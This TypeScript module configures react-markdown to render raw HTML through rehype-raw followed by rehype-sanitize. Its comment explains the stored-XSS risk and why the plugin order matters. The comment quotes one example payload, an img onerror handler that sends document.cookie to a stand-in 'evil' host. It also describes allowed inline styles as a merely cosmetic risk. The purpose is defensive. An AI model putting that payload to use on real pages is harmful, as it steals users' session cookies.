/**
 * Markdown rendering configuration, shared by every renderer in the app.
 *
 * WHY RAW HTML NEEDS TWO PLUGINS
 *
 * react-markdown escapes raw HTML by default — that is why `<div style="…">`
 * in a note rendered as literal text rather than as a red div. Enabling it
 * takes `rehype-raw`, which parses the HTML back into real nodes.
 *
 * On its own that would be a stored-XSS hole: a note containing
 * `<img src=x onerror="fetch('//evil/'+document.cookie)">` would execute on
 * every render, in your own session. Notes are personal today, but they are
 * saved to a database and rendered later, which is precisely the shape of a
 * stored payload — and the blast radius grows the moment notes are shared,
 * exported, or rendered in any context but the author's.
 *
 * So `rehype-sanitize` runs immediately after, and the order is load-bearing:
 * raw → parse to nodes, sanitize → strip anything dangerous. Reversing them
 * sanitizes the *escaped text* and then unescapes it, which is no protection
 * at all.
 *
 * WHAT THE SCHEMA ALLOWS
 *
 * The default sanitizer strips `style` outright, which would leave the
 * original problem unsolved. `style` and `className` are allowed back on all
 * elements: modern browsers do not evaluate script in CSS (`expression()` died
 * with IE), so the realistic risk is cosmetic rather than executable.
 *
 * `on*` handlers, `<script>`, `<iframe>` and javascript: URLs stay blocked —
 * those are the ones that actually run code.
 */
import rehypeRaw from "rehype-raw";
import rehypeSanitize, { defaultSchema } from "rehype-sanitize";
import remarkGfm from "remark-gfm";
import type { PluggableList } from "unified";

const schema = {
  ...defaultSchema,
  attributes: {
    ...defaultSchema.attributes,
    // Inline styling is the whole point of allowing HTML in a note — colour
    // coding an edge case is the common use.
    "*": [...(defaultSchema.attributes?.["*"] ?? []), "style", "className"],
  },
  tagNames: [
    ...(defaultSchema.tagNames ?? []),
    // Genuinely useful when writing up a problem, and none of them execute.
    "mark",
    "kbd",
    "sub",
    "sup",
    "details",
    "summary",
    "u",
    "small",
  ],
};

export const MARKDOWN_REMARK_PLUGINS: PluggableList = [remarkGfm];

/** Order matters: parse raw HTML first, then sanitize the resulting nodes. */
export const MARKDOWN_REHYPE_PLUGINS: PluggableList = [rehypeRaw, [rehypeSanitize, schema]];
